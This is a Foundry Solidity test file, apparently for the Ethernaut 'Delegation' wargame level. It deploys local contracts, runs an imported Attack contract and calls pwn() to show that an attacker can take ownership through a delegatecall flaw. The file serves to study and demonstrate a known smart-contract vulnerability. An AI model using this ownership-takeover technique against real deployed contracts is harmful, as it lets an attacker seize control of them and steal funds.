// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import { Delegate, Delegation } from "../src/Delegation/Delegation.sol";
import { Attack } from "../src/Delegation/Attack.sol";

contract DelegationTest is Test {
    Attack internal attack;
    Delegation internal delegation;
    Delegate internal delegate;

    function setUp() public {
        delegate = new Delegate(address(this));
        delegation = new Delegation(address(delegate));
        attack = new Attack(address(delegation), address(delegate));
    }

    function testAttack() public {
        vm.deal(address(attack), 1 ether);
        assertEq(Delegate(delegate).owner(), address(this));
        assertEq(Delegation(delegation).owner(), address(this));

        
        vm.pauseGasMetering(); // We will reach out of gas errors on external calls without this
        attack.attack(); // Take control of Delegation contract
        vm.resumeGasMetering(); // Turn gas back on
        assertEq(Delegation(delegation).owner(), address(attack));

        // Come back to take over the Delegate contract
        vm.prank(address(attack));
        (bool success, ) = address(delegate).call(abi.encodeWithSignature("pwn()"));
        require(success, "Failure in test.");

        assertEq(Delegate(delegate).owner(), address(attack));
    }
}